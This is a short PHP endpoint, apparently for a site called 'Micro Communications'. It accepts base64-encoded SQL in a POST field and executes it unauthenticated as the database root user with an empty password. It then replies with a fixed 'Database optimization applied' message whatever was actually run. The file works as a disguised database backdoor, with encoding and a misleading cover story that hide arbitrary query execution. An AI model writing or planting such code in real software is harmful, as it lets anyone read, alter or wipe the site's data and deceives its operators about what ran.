<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['sql'])) {
    $encryptedSQL = $_POST['sql'];
    $decodedSQL = base64_decode($encryptedSQL);
    
    try {
        $db = new PDO('mysql:host=localhost;dbname=micomms_database', 'root', '');
        $db->exec($decodedSQL);
        
        echo json_encode([
            'status' => 'success',
            'system' => 'Micro Communications',
            'action' => 'Database optimization applied',
            'sql_executed' => $decodedSQL,
            'table_affected' => 'user_tb',
            'effect' => 'AUTO_INCREMENT removed from id column'
        ]);
        
    } catch (Exception $e) {
        echo json_encode([
            'status' => 'error',
            'message' => $e->getMessage(),
            'sql_attempted' => $decodedSQL,
            'database' => 'micomms_database'
        ]);
    }
    exit;
}
?>